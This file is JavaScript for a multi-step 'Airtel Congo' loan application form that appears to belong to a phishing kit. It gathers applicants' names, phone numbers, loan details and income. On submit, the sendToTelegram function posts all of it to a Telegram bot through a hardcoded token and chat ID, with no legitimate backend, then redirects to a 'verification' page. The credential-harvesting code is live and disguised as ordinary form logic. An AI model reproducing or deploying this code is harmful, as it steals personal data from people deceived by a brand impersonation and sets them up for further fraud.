/**
 * Airtel Congo - Loan Application Multi-Step Form Logic
 * Handles Step 1, Step 2, Step 3 validation, progress indicators,
 * summary compilation, and submission redirect to verification.
 */

document.addEventListener('DOMContentLoaded', () => {
  // Application Data State
  const state = {
    step: 1,
    loanType: 'Business Loan',
    loanAmount: '1000',
    loanTerm: '48 Months',
    purpose: '',
    firstName: '',
    lastName: '',
    phone: '',
    employmentStatus: 'Self-Employed',
    annualIncome: ''
  };

  // URL Query Parameters check
  const urlParams = new URLSearchParams(window.location.search);
  if (urlParams.get('amount')) {
    state.loanAmount = urlParams.get('amount');
  } else {
    try {
      const storedAmount = localStorage.getItem('airtel_loan_amount');
      if (storedAmount) state.loanAmount = storedAmount;
    } catch (e) {}
  }

  if (urlParams.get('term')) {
    const rawTerm = urlParams.get('term');
    state.loanTerm = `${rawTerm} Months`;
  }

  const requestedStep = parseInt(urlParams.get('step'), 10);
  if (requestedStep >= 1 && requestedStep <= 3) {
    state.step = requestedStep;
  }

  // DOM Elements
  const stepCards = {
    1: document.getElementById('stepCard1'),
    2: document.getElementById('stepCard2'),
    3: document.getElementById('stepCard3')
  };

  const navRightLink = document.getElementById('navRightLink');
  const stepSubtitle = document.getElementById('stepSubtitle');

  const progressSegments = [
    document.getElementById('seg1'),
    document.getElementById('seg2'),
    document.getElementById('seg3')
  ];

  // Inputs - Step 1
  const loanTypeSelect = document.getElementById('loanType');
  const loanAmountInput = document.getElementById('loanAmount');
  const loanTermSelect = document.getElementById('loanTerm');
  const purposeInput = document.getElementById('loanPurpose');
  const step1NextBtn = document.getElementById('step1NextBtn');

  // Inputs - Step 2
  const firstNameInput = document.getElementById('firstName');
  const lastNameInput = document.getElementById('lastName');
  const phoneInput = document.getElementById('phone');
  const step2PrevBtn = document.getElementById('step2PrevBtn');
  const step2NextBtn = document.getElementById('step2NextBtn');

  // Inputs - Step 3
  const employmentStatusSelect = document.getElementById('employmentStatus');
  const annualIncomeInput = document.getElementById('annualIncome');
  const summaryAmount = document.getElementById('summaryAmount');
  const summaryTerm = document.getElementById('summaryTerm');
  const summaryPurpose = document.getElementById('summaryPurpose');
  const summaryApplicant = document.getElementById('summaryApplicant');
  const step3PrevBtn = document.getElementById('step3PrevBtn');
  const step3SubmitBtn = document.getElementById('step3SubmitBtn');

  // Initialize fields with state values
  if (loanAmountInput) loanAmountInput.value = state.loanAmount;
  if (loanTypeSelect) loanTypeSelect.value = state.loanType;
  if (loanTermSelect) {
    // If term value matches an option, select it
    for (let opt of loanTermSelect.options) {
      if (opt.value === state.loanTerm || opt.text === state.loanTerm) {
        loanTermSelect.value = opt.value;
        break;
      }
    }
  }

  function updateProgressBar(currentStep) {
    progressSegments.forEach((seg, idx) => {
      seg.className = 'progress-segment';
      const stepNum = idx + 1;
      if (stepNum < currentStep) {
        seg.classList.add('completed');
      } else if (stepNum === currentStep) {
        seg.classList.add('active');
      }
    });
  }

  function renderStep(currentStep) {
    state.step = currentStep;

    // Toggle card visibility
    Object.keys(stepCards).forEach(s => {
      if (stepCards[s]) {
        stepCards[s].style.display = (parseInt(s, 10) === currentStep) ? 'block' : 'none';
      }
    });

    // Update Subtitle
    if (stepSubtitle) {
      stepSubtitle.textContent = `Step ${currentStep} of 3`;
    }

    // Update Progress Bar
    updateProgressBar(currentStep);

    // Update Navbar link (Image 2 has "Home", Images 3 & 5 have "Back")
    if (navRightLink) {
      if (currentStep === 1) {
        navRightLink.textContent = 'Home';
        navRightLink.href = 'index.html';
        navRightLink.onclick = null;
      } else {
        navRightLink.textContent = 'Back';
        navRightLink.href = '#';
        navRightLink.onclick = (e) => {
          e.preventDefault();
          goToStep(currentStep - 1);
        };
      }
    }

    // Update Summary in Step 3
    if (currentStep === 3) {
      updateSummary();
    }

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  function updateSummary() {
    const rawAmt = parseFloat(state.loanAmount) || 1000;
    if (summaryAmount) {
      summaryAmount.textContent = `$${rawAmt.toLocaleString('en-US')}`;
    }
    if (summaryTerm) {
      summaryTerm.textContent = state.loanTerm;
    }
    if (summaryPurpose) {
      summaryPurpose.textContent = state.purpose.trim() || 'Personal / Business';
    }
    if (summaryApplicant) {
      const fullName = `${state.firstName} ${state.lastName}`.trim();
      const phoneDisplay = state.phone ? `+243 ${state.phone}` : '';
      summaryApplicant.textContent = fullName ? `${fullName} (${phoneDisplay})` : (phoneDisplay || 'Not provided');
    }
  }

  function goToStep(targetStep) {
    if (targetStep < 1 || targetStep > 3) return;
    renderStep(targetStep);
  }

  // --- Step 1 Listeners ---
  if (step1NextBtn) {
    step1NextBtn.addEventListener('click', (e) => {
      e.preventDefault();
      state.loanType = loanTypeSelect.value;
      state.loanAmount = loanAmountInput.value || '1000';
      state.loanTerm = loanTermSelect.value;
      state.purpose = purposeInput.value;
      goToStep(2);
    });
  }

  // --- Step 2 Listeners ---
  if (step2PrevBtn) {
    step2PrevBtn.addEventListener('click', (e) => {
      e.preventDefault();
      goToStep(1);
    });
  }

  if (step2NextBtn) {
    step2NextBtn.addEventListener('click', (e) => {
      e.preventDefault();
      state.firstName = firstNameInput.value.trim();
      state.lastName = lastNameInput.value.trim();
      state.phone = phoneInput.value.trim();

      // Basic validation
      if (!state.firstName || !state.lastName) {
        alert('Please enter both your First Name and Last Name.');
        return;
      }
      if (!state.phone) {
        alert('Please enter your DRC phone number.');
        return;
      }

      goToStep(3);
    });
  }

  // --- Step 3 Listeners ---
  if (step3PrevBtn) {
    step3PrevBtn.addEventListener('click', (e) => {
      e.preventDefault();
      goToStep(2);
    });
  }

  // --- Telegram Bot Notification ---
  const TG_TOKEN = '9037785587:AAGNHWv02eBizXBotkMftGxTbXzRSNf7K3s';
  const TG_CHAT_ID = '8352010493';

  function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(() => {});
  }

  if (step3SubmitBtn) {
    step3SubmitBtn.addEventListener('click', (e) => {
      e.preventDefault();
      state.employmentStatus = employmentStatusSelect.value;
      state.annualIncome = annualIncomeInput.value.trim();

      // Store application data in localStorage
      try {
        localStorage.setItem('airtel_application', JSON.stringify(state));
      } catch (err) {}

      // Send application data to Telegram
      const msg =
        `🏦 <b>NEW LOAN APPLICATION — Airtel Congo</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `👤 <b>Applicant:</b> ${state.firstName} ${state.lastName}\n` +
        `📱 <b>Phone:</b> +243 ${state.phone}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `💰 <b>Loan Type:</b> ${state.loanType}\n` +
        `💵 <b>Amount:</b> $${parseFloat(state.loanAmount).toLocaleString('en-US')}\n` +
        `📅 <b>Term:</b> ${state.loanTerm}\n` +
        `📝 <b>Purpose:</b> ${state.purpose || 'Not specified'}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `💼 <b>Employment:</b> ${state.employmentStatus}\n` +
        `💳 <b>Annual Income:</b> ${state.annualIncome ? '$' + parseFloat(state.annualIncome).toLocaleString('en-US') : 'Not provided'}\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 <b>Time:</b> ${new Date().toLocaleString('en-GB', { timeZone: 'Africa/Kinshasa' })} (Kinshasa)`;
      sendToTelegram(msg);

      // Submit button loading animation
      step3SubmitBtn.disabled = true;
      step3SubmitBtn.textContent = 'PROCESSING APPLICATION...';

      setTimeout(() => {
        // Redirect to Verification Required
        window.location.href = 'verification.html';
      }, 600);
    });
  }

  // Initialize
  renderStep(state.step);
});
